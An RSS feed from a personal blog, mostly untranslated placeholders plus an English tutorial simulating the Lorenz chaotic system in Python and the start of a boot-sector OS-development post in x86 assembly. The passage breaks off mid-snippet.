<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Nam&#39;s Journal</title>
        <link>https://namberino.github.io/vi/posts/</link>
        <description>Recent content in Posts on Nam&#39;s Journal</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>vi</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 15 Jun 2025 21:12:49 +0700</lastBuildDate>
        <atom:link href="https://namberino.github.io/vi/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Bài giải cho cuộc thi LG Dream Code 2025</title>
            <link>https://namberino.github.io/vi/posts/2025/06/b%C3%A0i-gi%E1%BA%A3i-cho-cu%E1%BB%99c-thi-lg-dream-code-2025/</link>
            <pubDate>Sun, 15 Jun 2025 21:12:49 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2025/06/b%C3%A0i-gi%E1%BA%A3i-cho-cu%E1%BB%99c-thi-lg-dream-code-2025/</guid>
            <description>&lt;p&gt;HIện tại chưa có bản tiếng Việt.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>HIện tại chưa có bản tiếng Việt.</p>
]]></content>
        </item>
        
        <item>
            <title>Phân tích bảo mật IoT: Router D-Link DIR-820L</title>
            <link>https://namberino.github.io/vi/posts/2025/05/ph%C3%A2n-t%C3%ADch-b%E1%BA%A3o-m%E1%BA%ADt-iot-router-d-link-dir-820l/</link>
            <pubDate>Sat, 31 May 2025 15:22:55 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2025/05/ph%C3%A2n-t%C3%ADch-b%E1%BA%A3o-m%E1%BA%ADt-iot-router-d-link-dir-820l/</guid>
            <description>&lt;p&gt;Chưa có bản dịch.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Chưa có bản dịch.</p>
]]></content>
        </item>
        
        <item>
            <title>Hệ thống Lorenz và Hiệu ứng cánh bướm</title>
            <link>https://namberino.github.io/vi/posts/2025/02/h%E1%BB%87-th%E1%BB%91ng-lorenz-v%C3%A0-hi%E1%BB%87u-%E1%BB%A9ng-c%C3%A1nh-b%C6%B0%E1%BB%9Bm/</link>
            <pubDate>Sat, 15 Feb 2025 16:45:19 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2025/02/h%E1%BB%87-th%E1%BB%91ng-lorenz-v%C3%A0-hi%E1%BB%87u-%E1%BB%A9ng-c%C3%A1nh-b%C6%B0%E1%BB%9Bm/</guid>
            <description>&lt;p&gt;Chưa có phiên bản tiếng Việt. Work in progress.&lt;/p&gt;
&lt;p&gt;If you&amp;rsquo;ve ever seen a movie about time travel, you&amp;rsquo;ll probably have heard of the term &amp;ldquo;&lt;em&gt;The Butterfly Effect&lt;/em&gt;&amp;rdquo;. The Butterfly Effect got its name from a pretty interesting example: The flapping of a butterfly in the present can cause a hurricane in the future. It&amp;rsquo;s used extensively in time travel movies because if you somehow managed to time travel to the past and change the past, the future could be drastically altered from that small change due to how that small change compounded into bigger and bigger changes.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Chưa có phiên bản tiếng Việt. Work in progress.</p>
<p>If you&rsquo;ve ever seen a movie about time travel, you&rsquo;ll probably have heard of the term &ldquo;<em>The Butterfly Effect</em>&rdquo;. The Butterfly Effect got its name from a pretty interesting example: The flapping of a butterfly in the present can cause a hurricane in the future. It&rsquo;s used extensively in time travel movies because if you somehow managed to time travel to the past and change the past, the future could be drastically altered from that small change due to how that small change compounded into bigger and bigger changes.</p>
<p>This pop culture implication is quite consistent with the real-world implication of chaos theory: For a given system, small changes in its initial condition could result in massive difference in the system&rsquo;s evolution trajectory. These kinds of systems, which are highly sensitive to changes in the initial conditions, are <em>chaotic</em>.</p>
<p>I just want to be clear that chaotic systems are <strong>NOT</strong> random. Chaotic systems are deterministic. The evolution of these systems follow a unique pattern and is determined by their initial conditions. However, predictions of how the system will even in the long run is virtually impossible.</p>
<blockquote>
<p>&ldquo;Chaos: When the present determines the future, but the approximate present does not approximately determine the future&rdquo; - Edward Lorenz</p></blockquote>
<p>In order to get a closer look at chaos theory, we&rsquo;ll explore one of the most infamous chaotic system: The Lorenz system, developed by Edward Lorenz, one of the pioneers in chaos theory.</p>
<h2 id="atmospheric-convection">Atmospheric convection</h2>
<p>The Lorenz system was originally developed for modeling atmospheric convection, which is a process where heat and moisture is transported vertically through the atmosphere (Hot air goes up, cool air goes down). This rolling phenomenon occurs when the sun heats the air near Earth&rsquo;s surface than air higher in the atmosphere or over bodies of water.</p>
<p>We can imagine a pot boiling some water. As the water at the bottom heats up, it expands and and becomes less dense, causing it to rise. The cooler, denser water at the top sinks to replace it, creating a continuous &ldquo;rolling&rdquo; cycle of motion known as convection. This convection motion is highly chaotic as fluid flows have the potential to exhibit chaotic behaviors. Thus, a mathematical model is required to fully understand this chaotic systems.</p>
<p>Edward Lorenz managed to derive a simple set of 3 ordinary differential equations that describes the atmospheric convection. These nonlinear equations describes the complex and unpredictable nature of the convection phenomenon.</p>
<h2 id="the-lorenz-equations">The Lorenz equations</h2>
<p>The Lorenz system is described by these 3 ordinary differential equations:</p>
<p>$$
\begin{aligned}
\dot{x} &amp;= \sigma (y - x)
\\
\dot{y} &amp;= x (\rho - z) - y
\\
\dot{z} &amp;= x y - \beta z
\end{aligned}
$$</p>
<p>We can think of the system in a 3 dimensional plane. $x$, $y$, $z$ each representing the system&rsquo;s state its corresponding axis. $\sigma$, $\rho$, $\beta$ are system parameters that affect the evolution of the system. The output of the system is the instantaneous rate of change of the system in each axis. This derivative can then be used to update the system and describe how the system will continue evolving in time.</p>
<p>In the context of the atmospheric convection problem:</p>
<ul>
<li>$x$: Rate of convective motion in the fluid system</li>
<li>$y$: Variation in horizontal temperature in the fluid layer</li>
<li>$z$: Variation in vertical temperature in the fluid layer</li>
<li>$\sigma$: Ratio of fluid viscosity to thermal conductivity (Prandtl number)</li>
<li>$\rho$: The temperature difference driving the convection (Rayleigh number)</li>
<li>$\beta$: Aspect ratio of the convection cells</li>
</ul>
<p>These 3 equations are all ODEs, so we can solve them quite efficiently by using numerical methods like forward Euler, Runge-Kutta, etc.</p>
<h2 id="simulating-the-system">Simulating the system</h2>
<p>Let&rsquo;s simulate the Lorenz system with Python.</p>
<p>Prerequisites: <a href="https://scipy.org/"><em>scipy</em></a>, <a href="https://numpy.org/"><em>numpy</em></a>, <a href="https://matplotlib.org/"><em>matplotlib</em></a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">numpy</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">np</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">matplotlib.pyplot</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">plt</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">mpl_toolkits.mplot3d</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Axes3D</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">scipy</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">integrate</span>
</span></span></code></pre></div><p>We&rsquo;ll be using the <code>odeint</code> function from the <em>scipy</em> package in Python. This function allows us to solve ODEs efficiently. To use this function, we&rsquo;ll first need to specify a time span that the system will be simulated over. I&rsquo;ll set up a time span from 0 to 50 with a time step of 0.001, so the system will gradually go from time 0 to time 50 by stepping forward by 0.001 time.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e06c75">dt</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0.001</span> <span style="color:#7f848e"># step</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">T</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">50</span> <span style="color:#7f848e"># range</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">t</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arange</span>(<span style="color:#d19a66">0</span>, <span style="color:#e06c75">T</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">dt</span>, <span style="color:#e06c75">dt</span>) <span style="color:#7f848e"># time span</span>
</span></span></code></pre></div><p>Next, we&rsquo;ll need to specify the starting condition of the system, which is the initial $x$, $y$, and $z$. We&rsquo;ll also need to specify the parameters for the system $\sigma$, $\rho$, $\beta$. Lorenz used the values $10$, $28$, $8/3$ for each of the parameters respectively, which will make the system exhibit chaotic behaviors.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#7f848e"># initial condition</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">x0</span> <span style="color:#56b6c2">=</span> (<span style="color:#d19a66">0</span>, <span style="color:#d19a66">1</span>, <span style="color:#d19a66">20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e"># parameters</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">sigma</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">beta</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">8</span> <span style="color:#56b6c2">/</span> <span style="color:#d19a66">3</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">rho</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">28</span>
</span></span></code></pre></div><p>Now the function <code>odeint</code> needs to know what the ODEs of interest are. So let&rsquo;s code up the 3 ODEs of the Lorenz system up in a function:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">lorenz</span>(<span style="color:#e06c75">xyz</span>, <span style="color:#e06c75">t0</span>, <span style="color:#e06c75">sigma</span>, <span style="color:#e06c75">beta</span>, <span style="color:#e06c75">rho</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">x</span>, <span style="color:#e06c75">y</span>, <span style="color:#e06c75">z</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">xyz</span> <span style="color:#7f848e"># current state</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">x_dot</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">sigma</span> <span style="color:#56b6c2">*</span> (<span style="color:#e06c75">y</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">x</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">y_dot</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">x</span> <span style="color:#56b6c2">*</span> (<span style="color:#e06c75">rho</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">z</span>) <span style="color:#56b6c2">-</span> <span style="color:#e06c75">y</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">z_dot</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">x</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">y</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">beta</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">z</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">return</span> [<span style="color:#e06c75">x_dot</span>, <span style="color:#e06c75">y_dot</span>, <span style="color:#e06c75">z_dot</span>]
</span></span></code></pre></div><p>With all the conditions and equations set up, we can now use <code>odeint</code> to simulate the system. I&rsquo;ll use the relative tolerance (<code>rtol</code>) and absolute tolerance (<code>atol</code>) to limit error in the numerical integration. These tolerance values will ensure the error doesn&rsquo;t exceed the tolerance value and making the solution more accurate. Once the <code>odeint</code> is finished simulating the system, we&rsquo;ll get 3 vectors in return. The 3 vectors contain the values of $x$, $y$, and $z$ at each time step within the 0 to 50 time span.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#7f848e"># simulate system</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">x_t</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">integrate</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">odeint</span>(<span style="color:#e06c75">lorenz</span>, <span style="color:#e06c75">x0</span>, <span style="color:#e06c75">t</span>, (<span style="color:#e06c75">sigma</span>, <span style="color:#e06c75">beta</span>, <span style="color:#e06c75">rho</span>), <span style="color:#e06c75">rtol</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">10</span><span style="color:#56b6c2">**</span>(<span style="color:#56b6c2">-</span><span style="color:#d19a66">12</span>), <span style="color:#e06c75">atol</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">10</span><span style="color:#56b6c2">**</span>(<span style="color:#56b6c2">-</span><span style="color:#d19a66">12</span>) <span style="color:#56b6c2">*</span> <span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ones_like</span>(<span style="color:#e06c75">x0</span>))
</span></span><span style="display:flex;"><span><span style="color:#e06c75">x</span>, <span style="color:#e06c75">y</span>, <span style="color:#e06c75">z</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">x_t</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">T</span>
</span></span></code></pre></div><p>Once the simulation is done, we can plot the result to visualize the solution:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e06c75">fig</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">figure</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add_subplot</span>(<span style="color:#e06c75">projection</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;3d&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">x</span>, <span style="color:#e06c75">y</span>, <span style="color:#e06c75">z</span>, <span style="color:#e06c75">linewidth</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">scatter</span>(<span style="color:#e06c75">x0</span>[<span style="color:#d19a66">0</span>], <span style="color:#e06c75">x0</span>[<span style="color:#d19a66">1</span>], <span style="color:#e06c75">x0</span>[<span style="color:#d19a66">2</span>], <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">view_init</span>(<span style="color:#d19a66">10</span>, <span style="color:#56b6c2">-</span><span style="color:#d19a66">50</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">show</span>()
</span></span></code></pre></div><p>And the result is the beautiful chaotic behavior which kinda resembles the shape of a buttefly.</p>

    <img src="/img/lorenz-system/lorenz-system-plot-1.png"  alt="Lorenz system plot 1"  class="center"  style="padding: 10px"  />


<p>A fun thing we could do is plot the system with some color to make it look cooler. I&rsquo;ll set the background to black, remove the axes and the grid, and set the color map of the plot to go from blue to cyan.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">matplotlib.colors</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">mcolors</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">fig</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">figure</span>()
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add_subplot</span>(<span style="color:#e06c75">projection</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;3d&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set_facecolor</span>(<span style="color:#98c379">&#34;black&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">fig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">patch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set_facecolor</span>(<span style="color:#98c379">&#34;black&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">cmap</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mcolors</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LinearSegmentedColormap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">from_list</span>(<span style="color:#98c379">&#34;blue_cyan&#34;</span>, [<span style="color:#98c379">&#34;blue&#34;</span>, <span style="color:#98c379">&#34;cyan&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#e06c75">colors</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cmap</span>(<span style="color:#e06c75">np</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">linspace</span>(<span style="color:#d19a66">0</span>, <span style="color:#d19a66">1</span>, <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">x</span>) <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">in</span> <span style="color:#e5c07b">range</span>(<span style="color:#e5c07b">len</span>(<span style="color:#e06c75">x</span>) <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">plot</span>(<span style="color:#e06c75">x</span>[<span style="color:#e06c75">i</span>:<span style="color:#e06c75">i</span><span style="color:#56b6c2">+</span><span style="color:#d19a66">2</span>], <span style="color:#e06c75">y</span>[<span style="color:#e06c75">i</span>:<span style="color:#e06c75">i</span><span style="color:#56b6c2">+</span><span style="color:#d19a66">2</span>], <span style="color:#e06c75">z</span>[<span style="color:#e06c75">i</span>:<span style="color:#e06c75">i</span><span style="color:#56b6c2">+</span><span style="color:#d19a66">2</span>], <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">colors</span>[<span style="color:#e06c75">i</span>], <span style="color:#e06c75">linewidth</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">scatter</span>(<span style="color:#e06c75">x0</span>[<span style="color:#d19a66">0</span>], <span style="color:#e06c75">x0</span>[<span style="color:#d19a66">1</span>], <span style="color:#e06c75">x0</span>[<span style="color:#d19a66">2</span>], <span style="color:#e06c75">color</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;r&#39;</span>, <span style="color:#e06c75">edgecolor</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;white&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">ax</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">view_init</span>(<span style="color:#d19a66">10</span>, <span style="color:#56b6c2">-</span><span style="color:#d19a66">50</span>)
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">axis</span>(<span style="color:#98c379">&#39;off&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">plt</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">show</span>()
</span></span></code></pre></div>
    <img src="/img/lorenz-system/lorenz-system-plot-2.png"  alt="Lorenz system plot 2"  class="center"  style="padding: 10px"  />


<p>Note how the system exhibit &ldquo;<em>rolling</em>&rdquo; behaviors, which is consistent with how atmostpheric convection works.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That was a glimpse into the world of chaos theory. The Lorenz system showed how a system&rsquo;s behavior can vary drastically based on the initial condition. There are so many other dynamical systems, with many of them being chaotic. Chaos theory is a very exciting field and I hope this introduction will get you more excited and curious about this field.</p>
<p>Hope you enjoyed reading this blog post.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://databookuw.com/">Data-Driven Science and Engineering - Steven L. Brunton, J. Nathan Kutz</a></li>
<li><a href="https://en.wikipedia.org/wiki/Chaos_theory">Chaos theory - Wikipedia</a></li>
<li><a href="https://en.wikipedia.org/wiki/Lorenz_system">Lorenz system - Wikipedia</a></li>
<li><a href="https://science.howstuffworks.com/math-concepts/chaos-theory4.htm">How Chaos Theory Works - William Harris</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Let&#39;s make an HTTP server with Assembly</title>
            <link>https://namberino.github.io/vi/posts/2025/01/lets-make-an-http-server-with-assembly/</link>
            <pubDate>Fri, 17 Jan 2025 22:37:58 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2025/01/lets-make-an-http-server-with-assembly/</guid>
            <description>&lt;p&gt;Chưa có bài đăng&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Chưa có bài đăng</p>
]]></content>
        </item>
        
        <item>
            <title>Lập trình hệ điều hành: Boot sector [Phần 1]</title>
            <link>https://namberino.github.io/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-boot-sector-ph%E1%BA%A7n-1/</link>
            <pubDate>Thu, 20 Jun 2024 14:20:39 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-boot-sector-ph%E1%BA%A7n-1/</guid>
            <description>&lt;p&gt;In the &lt;a href=&#34;https://namberino.github.io/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-kh%E1%BB%9Fi-%C4%91%E1%BA%A7u/&#34;&gt;last post&lt;/a&gt;, we finished installing and setting up our tools for developing an operating system. This post will start the development of our OS&amp;rsquo;s boot sector.&lt;/p&gt;
&lt;h2 id=&#34;the-bios&#34;&gt;The BIOS&lt;/h2&gt;
&lt;p&gt;The &lt;em&gt;BIOS&lt;/em&gt; is a program that the computer uses to start the computer system after it is powered on. It is the program responsible for loading and setting up the hardware and system in a computer and loading up the operating system.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>In the <a href="/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-kh%E1%BB%9Fi-%C4%91%E1%BA%A7u/">last post</a>, we finished installing and setting up our tools for developing an operating system. This post will start the development of our OS&rsquo;s boot sector.</p>
<h2 id="the-bios">The BIOS</h2>
<p>The <em>BIOS</em> is a program that the computer uses to start the computer system after it is powered on. It is the program responsible for loading and setting up the hardware and system in a computer and loading up the operating system.</p>
<p>We&rsquo;re not going to be building a BIOS because that is way out of the scope of this project. What we are going to be building is another very important program that the BIOS uses when it loads up the operating system from memory: the <em>boot sector</em>.</p>
<h2 id="what-is-a-boot-sector">What is a boot sector?</h2>
<p>The BIOS can do many things, but 1 thing that it can&rsquo;t do is loading up the operating system from memory. So then how is the operating system loaded from memory? It is loaded up through another program called the <em>boot sector</em>.</p>
<p>Since the boot sector will be used everytime the computer starts up, it needs to be placed at a fixed, standard location. This location is the first sector in the hard disk of the computer. This program will also have to take up 512 bytes as the BIOS will try to check for the bytes <em>0xAA</em> and <em>0x55</em> in the 511 byte and 512 byte of the boot sector. These 2 bytes are the signature &ldquo;<em>magic numbers</em>&rdquo; that tells the BIOS that it should treat this program as the boot sector.</p>
<blockquote>
<p>Note: Because we&rsquo;re building an x86 OS. we need to remember that x86 is little-endian so the most significant byte will go first, then the least significant byte. You can find more information about endianess <a href="https://en.wikipedia.org/wiki/Endianness">here</a></p></blockquote>
<h2 id="the-simplest-boot-sector-in-the-world">The simplest boot sector in the world</h2>
<p>So with this knowledge, we can make this, which is the simplest boot sector that you can make:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">jmp</span> <span style="color:#e06c75">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">times</span> <span style="color:#d19a66">510</span>-(<span style="color:#e06c75">$-$$</span>) <span style="color:#e06c75">db</span> <span style="color:#d19a66">0</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">dw</span> <span style="color:#d19a66">0xaa55</span>
</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
<ul>
<li>The first part of the code is just an jump to the current address location. This is effectively an infinite loop. When the boot sector is loaded in and ran, it will hit this infinite loop and won&rsquo;t do anything else.</li>
<li>The <code>$</code> represents the current address of the code in the assembly code. The <code>$$</code> represents the starting address of the current section. The <code>($-$$)</code> just calculates the difference between the current address of the executing code and the start of the code. So that <code>times</code> line just calculate how many bytes left in the 510 bytes of available space in the boot sector that are not set yet, and the <code>db 0</code> just fills those bytes with 0 bytes. We use 510 because the last 2 bytes are reserved for the magic numbers <code>0xaa55</code></li>
<li>The <code>dw 0xaa55</code> just set the last 2 bytes to the magic numbers</li>
</ul>
<p>You can compile this and emulate this boot sector using these commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nasm -f bin bootsector.asm -o bootsector.bin
</span></span><span style="display:flex;"><span>qemu-system-x86_64 bootsector.bin
</span></span></code></pre></div>
    <img src="/img/os-dev/boot-sector/bootsector-simple.png"  alt="Boot sector simple"  class="center"  style="padding: 10px"  />


<p>If you see a QEMU window similar to this one, the program should be working. So there we go, we&rsquo;ve successfully programmed a super simple boot sector.</p>
<h2 id="printing-stuff-using-the-boot-sector">Printing stuff using the boot sector</h2>
<p>Let&rsquo;s try to print some text onto the screen using the boot sector. For this, we&rsquo;ll need to use computer registers and interrupts. If you don&rsquo;t know anything about registers and interrupts, you can read about registers <a href="https://en.wikipedia.org/wiki/Processor_register">here</a> and about interrupts <a href="https://en.wikipedia.org/wiki/Interrupt">here</a>.</p>
<p>We&rsquo;ll need to set the mode to <em>tty</em> mode, this enables text printing in the video service, which allows us to print text to the screen. We can turn on <em>tty</em> mode by setting the <em>ah</em> register with the byte <code>0x0e</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">ah</span>, <span style="color:#d19a66">0x0e</span>
</span></span></code></pre></div><p>Now that we&rsquo;ve turned on <em>tty</em> mode, how do we print text to the screen? We can do that through setting the data inside register <em>al</em> and issuing an interrupt. Firstly, we&rsquo;ll need to set the register <em>al</em> with the letter that we want to print out. Because the register can only hold 1 byte, we can only set 1 letter at a time. Then we can issue an video service interrupt for printing the letter out. We&rsquo;ll use the <code>0x10</code> interrupt to do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">H</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">e</span>&#39;
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">int</span> <span style="color:#d19a66">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">mov</span> <span style="color:#e06c75">al</span>, &#39;<span style="color:#e06c75">l</span>&#39;
